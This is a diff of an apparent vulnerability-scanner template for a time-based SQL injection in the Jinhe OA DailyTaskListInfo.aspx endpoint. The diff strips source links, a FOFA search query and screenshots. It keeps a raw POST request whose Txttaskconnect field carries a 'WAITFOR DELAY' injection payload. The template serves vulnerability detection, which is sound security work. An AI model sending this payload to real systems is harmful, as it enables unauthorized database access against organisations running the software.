@@ -3,12 +3,8 @@ info:
   name: 金和OA-DailyTaskListInfo存在SQL注入漏洞.docx
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bd5g3a7fvar12rcs'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bd5g3a7fvar12rcs
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'POST /c6/Jhsoft.Web.dailytaskmanage/DailyTaskListInfo.aspx/ HTTP/1.1
@@ -20,11 +16,8 @@ http:
 
     __EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&_ListPage1LockNumber=1&_ListPage1RecordCount=0&__VIEWSTATE=xxxx&txtSelectTaskIDList=&DrpTaskType=all&DrptaskState=0&txttaskname=&Txttaskconnect=''WAitfor+DelaY''0:0:5''--&txtBeginTime=&txtEndTime=&Txttaskdept=%B5%A5%BB%F7%D1%A1%D4%F1%B2%BF%C3%C5&hidTaskdept=&Txttaskexecutor=&seltktype=%C7%EB%D1%A1%D4%F1&btnSearch=%B2%E9%D1%AF&Txttaskdeptid=&hidFlag=0&__VIEWSTATEGENERATOR=xxxx
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121905233-445fcf77-b4a1-491f-9d37-8a1bcd7bcba1.png)
 
-    参数获取不全得可以先访问DailyTaskListInfo.aspx从页面获取接口参数
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1754121905522-7960c5df-f143-48c1-a05b-2f26561e4b2f.png)'
+    参数获取不全得可以先访问DailyTaskListInfo.aspx从页面获取接口参数'
   redirects: false
   matchers:
   - status:
